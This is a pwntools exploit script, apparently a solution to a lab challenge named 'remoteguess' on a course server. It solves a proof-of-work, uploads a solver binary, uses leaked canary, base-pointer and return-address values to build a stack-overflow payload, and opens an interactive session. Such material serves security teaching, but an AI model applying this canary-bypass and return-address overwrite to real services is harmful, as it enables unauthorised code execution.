#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

def solve_pow(r):
    prefix = r.recvline().decode().split("'")[1]
    print("solving pow ...")
    solved = b''
    for i in range(1000000000):
        h = hashlib.sha1((prefix + str(i)).encode()).hexdigest()
        if h[:6] == '000000':
            solved = str(i).encode()
            print("solved =", solved)
            break;
    print("done.")

    r.sendlineafter(b'string S: ', base64.b64encode(solved))
payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

r = process("./remoteguess", shell=True)
#pause()

#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)


if type(r) != pwnlib.tubes.process.process:
    solve_pow(r)

if payload != None:
    ef = ELF(exe)

    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
    
    
else:
    r.sendlineafter(b'send to me? ', b'0')


r.recvline() # no-used

rbp = r.recvline().decode() #rbp

ret_addr= r.recvline().decode() #reture addr content
new_addr = int(ret_addr,16)-int("0xdc70",16)

canary = r.recvline().decode() # canary content

#print(rbp)
#print(canary)
#print(ret_addr)

myguess = 1234
buf = str('0').encode('ascii').ljust(24,b'\0')

buf += p64(int(canary,16))
buf += p64(int(rbp,16))
buf += p64(new_addr)
buf += str('0').encode('ascii').ljust(16,b'\0')

print(buf)

r.sendlineafter(b'your answer? ', buf)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :